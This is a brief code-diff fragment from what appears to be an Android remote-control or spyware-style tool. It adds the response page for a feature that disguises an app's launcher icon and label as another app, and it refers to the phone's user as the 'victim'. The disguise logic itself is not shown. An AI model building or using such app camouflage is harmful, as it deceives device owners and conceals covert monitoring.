+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"appName\": \"" + safeAppName + "\", \"alias\": \"" + targetAlias + "\"}");
+            }
+
+            String html = getHeader(session.getUri()) + 
+                "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-cyan);\">🎭</div><h2>App Identity Morphed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">Launcher camouflage active as <b>" + escapeHtml(appName) + "</b> (" + escapeHtml(pkg) + ").<br>Icon and label assigned via <b>" + targetAlias + "</b> with dynamic icon bitmap pinning.<br>Victim launches on the home screen will seamlessly pass through to the real application.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/device/apps\" class=\"btn\">Back to Apps</a></div></div></div>" + getFooter();
+            return serveGzipped(session, "text/html", html);
+        } catch (Exception e) {
+            return serveError(session, "Failed to masquerade app: " + e.getMessage());
+        }
     }
 
     private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
